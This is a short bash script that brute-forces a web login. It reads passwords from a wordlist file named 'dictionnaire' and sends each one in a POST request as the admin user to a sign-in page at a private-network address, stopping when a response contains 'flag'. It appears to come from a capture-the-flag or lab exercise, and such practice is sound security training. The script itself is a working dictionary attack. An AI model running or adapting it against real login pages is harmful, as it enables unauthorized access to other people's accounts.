#!/bin/bash
for i in $(cat dictionnaire)
	do
		curl -X POST "http://192.168.156.114/index.php?page=signin&username=admin&password=$i&Login=Login#" | grep 'flag'>>result.txt
if grep 'flag' ./result.txt
then
  echo "Password: $i">>result.txt
  exit
else
  echo "not $i"
fi
done

